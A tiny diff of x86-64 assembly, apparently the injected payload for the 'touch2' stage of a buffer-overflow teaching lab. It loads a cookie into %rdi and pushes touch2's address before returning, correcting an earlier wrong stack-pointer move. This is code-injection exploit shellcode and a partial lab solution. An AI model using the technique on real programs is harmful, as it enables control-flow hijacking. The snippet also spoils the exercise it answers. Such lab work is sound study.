@@ -1,3 +1,3 @@
 movq $0x59b997fa,%rdi # rdi = cookie
-movq $0x5561dc98,%rsp # address of touch2
+pushq $0x4017ec       # touch2
 ret
